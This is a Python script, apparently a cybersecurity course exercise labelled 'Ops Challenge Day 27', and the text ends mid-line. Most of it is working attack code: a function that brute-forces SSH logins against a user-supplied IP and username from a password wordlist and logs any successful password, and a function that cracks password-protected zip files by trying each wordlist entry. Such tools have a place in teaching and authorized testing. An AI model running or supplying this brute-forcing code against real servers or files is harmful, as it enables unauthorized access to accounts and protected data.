# Ops Challenge Day 27
# Justin 'Sage' 
# Utilized ChatGPT


import logging
import time
import paramiko
import zipfile
from logging.handlers import RotatingFileHandler

# Create and configure logger with log rotation
log_filename = "newfile.log"
log_max_size = 1024 * 1024  # 1MB
log_backup_count = 5
log_formatter = logging.Formatter('%(asctime)s %(message)s')
log_handler = RotatingFileHandler(log_filename, mode='a', maxBytes=log_max_size,
                                  backupCount=log_backup_count, encoding='utf-8')
log_handler.setFormatter(log_formatter)
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
logger.addHandler(log_handler)

# Declare functions
def iterator():
    filepath = input("Enter your dictionary filepath:\n")
    logger.debug(f"Iterator function called with filepath: {filepath}")

    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            word = line.rstrip()
            print(word)
            time.sleep(1)

def check_password():
    target = input("Enter the password you want to search for:\n")
    filepath = input("Enter your dictionary filepath:\n")
    logger.debug(f"check_password function called with target: {target}, filepath: {filepath}")

    found = False
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            word = line.rstrip()
            if word == target:
                found = True
                break
    
    if found:
        print("The password was found in the word list.")
        logger.info("The password was found in the word list.")
    else:
        print("The password was not found in the word list.")
        logger.info("The password was not found in the word list.")

def ssh_login():
    ip = input("Enter the IP address of the SSH server:\n")
    username = input("Enter the username:\n")
    filepath = input("Enter your dictionary filepath:\n")
    logger.debug(f"ssh_login function called with ip: {ip}, username: {username}, filepath: {filepath}")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            password = line.rstrip()
            try:
                ssh.connect(ip, username=username, password=password, timeout=5)
                print(f"Successful login with password: {password}")
                logger.info(f"Successful login with password: {password}")
                ssh.close()
                break
            except paramiko.AuthenticationException:
                print(f"Failed login with password: {password}")
                logger.warning(f"Failed login with password: {password}")
            except Exception as e:
                print(f"Error occurred: {e}")
                logger.error(f"Error occurred: {e}")
                break

def unzip_file():
    zip_filepath = input("Enter the filepath of the password-locked zip file:\n")
    filepath = input("Enter your dictionary filepath:\n")
    logger.debug(f"unzip_file function called with zip_filepath: {zip_filepath}, filepath: {filepath}")

    with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
        with open(filepath, encoding="ISO-8859-1") as file:
            for line in file:
                password = line.rstrip()
                try:
                    zip_ref.extractall(pwd=password.encode('cp850', 'replace'))
                    print(f"Successfully extracted the
